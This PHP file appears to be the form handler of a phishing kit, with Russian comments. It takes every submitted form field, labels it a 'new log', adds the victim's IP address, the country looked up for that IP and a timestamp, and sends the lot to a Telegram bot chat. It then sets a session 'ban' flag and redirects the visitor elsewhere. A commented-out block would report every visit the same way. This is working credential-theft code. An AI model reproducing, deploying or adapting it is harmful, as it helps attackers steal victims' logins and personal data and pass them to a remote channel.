<?php
require_once './config.php';

date_default_timezone_set($timeZone);

if (isset($_SESSION['ban'])) {
  header("Location: $REDIRECT_URL");
  die();
}

#Получение IP адреса
function getUserIP()
{
  if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
    return $_SERVER['REMOTE_ADDR'];
  } elseif (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {

    $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    return trim($ipList[0]);
  }
  return '';
}

#Получение региона по IP
function getUserRegion($ip) {
    $response = file_get_contents("https://ipinfo.io/$ip");
    $data = json_decode($response);
    if ($data && isset($data->country)) {
        return $data->country;
    } else {
        return "None";
    }
}

#Отслеживание захода на сайт
// $text = 'Новый заход на сайт' . "\n\n";
// $text .= "\n🔮IP: " . getUserIP();
// $text .= "\n Локация: " . getUserRegion($ip = getUserIP());
// $text .= $_SERVER['HTTP_USER_AGENT'];

// $param = [
//   "chat_id" => $chat_id,
//   "text" => $text,
//   'parse_mode' => 'HTML'
// ];

// $options = [
//   CURLOPT_URL => $url,
//   CURLOPT_POST => true,
//   CURLOPT_POSTFIELDS => http_build_query($data),
//   CURLOPT_RETURNTRANSFER => true,
// ];

// $ch = curl_init();
// curl_setopt_array($ch, $options);
// curl_exec($ch);

#Пользователь заргеистрировался
$text = '<b>' . '✅ Пришел новый лог' . '</b>' . "\n\n";
foreach ($_POST as $key => $val) {
    $text .= $key . ": " . '<b>' . $val . '</b>' . "\n";
}
$text .= "\n🔮IP: " . '<b>' . getUserIP() . '</b>';
$text .= "\n Локация: " . '<b>' .getUserRegion($ip = getUserIP()) . '</b>';
$text .= "\n⏱️Время: " . '<b>' . date('d.m.y H:i:s') . '</b>';

$param = [
    "chat_id" => $chat_id,
    "text" => $text,
    'parse_mode' => 'HTML'
];

$url = "https://api.telegram.org/bot" . $tg_bot_token . "/sendMessage?" . http_build_query($param);

file_get_contents($url);

$_SESSION['ban'] = true;

header("Location: $redirect_url");
die();
